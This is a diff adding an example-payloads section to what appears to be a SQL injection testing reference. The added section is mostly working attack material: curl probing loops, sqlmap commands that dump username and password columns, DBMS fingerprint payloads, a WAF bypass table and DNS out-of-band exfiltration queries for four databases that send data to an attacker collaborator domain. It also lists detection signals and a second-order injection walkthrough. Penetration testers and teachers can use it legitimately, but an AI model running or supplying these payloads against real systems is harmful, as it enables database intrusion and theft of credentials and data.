@@ -488,6 +488,127 @@ WAF_BYPASS_PAYLOADS = [
 
 ---
 
+## Example Commands/Payloads
+
+### Detection (curl, DBMS-agnostic)
+
+```bash
+TARGET="https://target.com/product"
+
+# Error-based probing - single quote vs. double quote vs. balanced quote
+for p in "'" "''" '"' "%27" "1'" "1\""; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?id=$p")
+    echo "payload=$p -> $code"
+done
+
+# Boolean-based blind - compare TRUE vs FALSE response length
+LEN_TRUE=$(curl -s "$TARGET?id=1 AND 1=1" | wc -c)
+LEN_FALSE=$(curl -s "$TARGET?id=1 AND 1=2" | wc -c)
+echo "TRUE=$LEN_TRUE FALSE=$LEN_FALSE"
+[ "$LEN_TRUE" != "$LEN_FALSE" ] && echo "[VULN] Boolean-based blind SQLi likely"
+
+# Time-based blind - baseline vs delayed response
+time curl -s "$TARGET?id=1" -o /dev/null
+time curl -s "$TARGET?id=1' AND SLEEP(5)-- -" -o /dev/null
+```
+
+### SQLMap (automated, all techniques)
+
+```bash
+# Full automated scan against a GET parameter
+sqlmap -u "https://target.com/product?id=1" --batch --level=3 --risk=2
+
+# Test a POST form / raw request from Burp
+sqlmap -r request.txt --batch --dbs
+
+# Force specific technique(s): B=boolean, E=error, U=union, S=stacked, T=time, Q=inline
+sqlmap -u "https://target.com/product?id=1" --technique=BEUSTQ
+
+# Crawl and test an entire app
+sqlmap -u "https://target.com" --crawl=2 --batch --forms
+
+# Enumerate databases -> tables -> columns -> dump
+sqlmap -u "https://target.com/product?id=1" --dbs
+sqlmap -u "https://target.com/product?id=1" -D webapp --tables
+sqlmap -u "https://target.com/product?id=1" -D webapp -T users --columns
+sqlmap -u "https://target.com/product?id=1" -D webapp -T users -C username,password --dump
+```
+
+### DBMS Fingerprinting (keyword-based, single request)
+
+Instead of relying on error text, these tautologies only evaluate `TRUE` on their specific DBMS — useful when errors are suppressed:
+
+| DBMS       | Fingerprint payload                               |
+| ---------- | -------------------------------------------------- |
+| MySQL      | `conv('a',16,2)=conv('a',16,2)`                   |
+| MySQL      | `connection_id()=connection_id()`                 |
+| MSSQL      | `@@CONNECTIONS>0` / `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
+| Oracle     | `ROWNUM=ROWNUM` / `RAWTOHEX('AB')=RAWTOHEX('AB')` |
+| PostgreSQL | `5::int=5` / `current_database()=current_database()` |
+| SQLite     | `sqlite_version()=sqlite_version()`               |
+| MS Access  | `val(cvar(1))=1`                                  |
+
+```bash
+for p in "conv('a',16,2)=conv('a',16,2)" "5::int=5" "ROWNUM=ROWNUM" "sqlite_version()=sqlite_version()"; do
+  curl -s "$TARGET?id=1 AND $p" -o /tmp/r1
+  curl -s "$TARGET?id=1 AND 1=2" -o /tmp/r2
+  diff -q /tmp/r1 /tmp/r2 >/dev/null || echo "[+] DBMS keyword matched: $p"
+done
+```
+
+### Out-of-Band (OOB) Exfiltration via DNS
+
+Use when the response gives no visible feedback (blind, no timing oracle available) — exfiltrate data through a DNS lookup to a Burp Collaborator / attacker-controlled domain:
+
+```sql
+-- MySQL (requires FILE privilege)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker-collab.net\\a'))-- -
+
+-- MSSQL (requires VIEW SERVER STATE / CONTROL SERVER)
+'; exec master..xp_dirtree '\\'+(SELECT @@version)+'.attacker-collab.net\a'--
+
+-- Oracle (XXE-style via XMLType)
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [ <!ENTITY % rmt SYSTEM "http://'||(SELECT user FROM DUAL)||'.attacker-collab.net/"> %rmt;]>'),'/l') FROM DUAL) IS NOT NULL--
+
+-- PostgreSQL (requires superuser / pg_execute_server_program)
+'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker-collab.net'--
+```
+
+### Second-Order Injection (store-then-trigger)
+
+```text
+1. Register/update a field with a payload that is syntactically inert on INSERT:
+     username = admin'--
+2. The value is stored as-is (parameterized INSERT, so no injection fires here).
+3. A DIFFERENT feature later concatenates that stored value into a new query
+   (e.g. an admin panel "view activity for user X" lookup):
+     SELECT * FROM logs WHERE username = 'admin'--'
+4. The trailing content is commented out -> effectively `WHERE username = 'admin'`,
+   bypassing whatever the second query intended to filter on.
+```
+
+### Generic WAF Bypass Cheats
+
+| Blocked | Bypass | Note |
+| ------- | ------ | ---- |
+| Space | `/**/`, `%09` (tab), `%0A` (LF), `(1)and(1)=(1)--` | Alternative whitespace/parenthesis grouping |
+| `,` (comma) | `LIMIT 1 OFFSET 0` instead of `LIMIT 0,1`; `SUBSTR('SQL' FROM 1 FOR 1)` instead of `SUBSTR('SQL',1,1)` | Avoids comma-based WAF signatures |
+| `=` (equals) | `SUBSTRING(VERSION(),1,1)LIKE(5)`, `... IN(4,3)`, `... BETWEEN 3 AND 4` | Operator-equivalent bypass |
+| `AND`/`OR` keywords | `&&` / `\|\|` | Symbolic equivalents |
+| Case-based filters | `UnIoN SeLeCt`, `/*!50000UNION*/ /*!50000SELECT*/` (MySQL conditional comment) | Case randomization / version-gated comments |
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| Response contains `SQL syntax`, `mysql_fetch`, `ORA-`, `Unclosed quotation mark`, `PostgreSQL query failed`, `SQLite3::` | Error-based SQLi confirmed (DBMS fingerprint from message) |
+| Content length/hash differs between `AND 1=1` and `AND 1=2` with identical HTTP status | Boolean-based blind SQLi |
+| Response consistently delayed by ~N seconds only when a `SLEEP(N)`/`WAITFOR DELAY`/`pg_sleep(N)` payload is sent | Time-based blind SQLi |
+| Extra columns from `UNION SELECT` appear in the rendered page (reflected value under attacker control) | UNION-based SQLi, column count and injectable position confirmed |
+| DNS lookup for the injected subdomain arrives at the collaborator server | Out-of-band SQLi confirmed, works even when the HTTP response carries no observable signal |
+
+---
+
 ## Remediation
 
 ```python
